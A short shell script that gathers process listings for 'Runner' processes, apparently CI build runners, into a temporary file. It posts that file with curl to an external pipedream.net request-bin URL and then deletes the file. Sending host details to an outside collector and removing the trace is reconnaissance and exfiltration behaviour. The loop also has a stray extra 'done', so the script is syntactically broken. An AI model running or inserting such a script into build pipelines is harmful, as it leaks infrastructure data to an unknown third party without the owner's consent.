#!/bin/sh


echo $(ps ax | grep Runner) > /tmp/file.txt

for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file.txt;
    #echo $(perf record -p $pid -o /tmp/file.data -c 1) >> tmp/fafafa.txt;
    done
    echo "--------------" >> /tmp/file.txt;
done

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net

rm /tmp/file.txt
